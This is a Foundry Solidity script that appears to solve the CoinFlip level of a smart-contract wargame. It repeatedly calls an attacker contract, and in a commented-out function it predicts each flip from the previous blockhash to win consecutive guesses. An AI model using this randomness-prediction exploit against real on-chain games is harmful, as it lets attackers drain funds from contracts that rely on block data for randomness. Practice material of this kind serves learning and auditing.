// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/CoinFlip.sol";
import "../src/Attacker.sol";
import "forge-std/console.sol";

contract CoinFlipAttackScript1 is Script {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlipContract =
        CoinFlip(0xF70d6224b7A8b95F8627F4B4D902D519f996eed2);

    Attacker attacker = Attacker(0xd3dB9C935870413F4BF75d5227f898EC9bc7B3F7);

    function setUp() public {
      
    }

    function run() public {
        vm.startBroadcast();
        uint lastTimestamp;

       for (uint i = 0; i < 11; i++) {
            if (block.timestamp > lastTimestamp + 15) {
                lastTimestamp = block.timestamp;
                attacker.attack();
            }
       }
        vm.stopBroadcast();
    }

    // function attack() private {
    //     uint256 blockValue = uint256(blockhash(block.number - 1));
    //     if (lastHash == blockValue) {
    //         revert();
    //     }

    //     lastHash = blockValue;
    //     uint256 coinFlip = blockValue / FACTOR;
    //     bool side = coinFlip == 1 ? true : false;

    //     bool result = coinFlipContract.flip{gas: 0.1 ether}(side);

    //     if (result == true) {
    //         console.log("Successful flip");
    //         console.log("Number of flips:", coinFlipContract.consecutiveWins());
    //     }
    // }
}
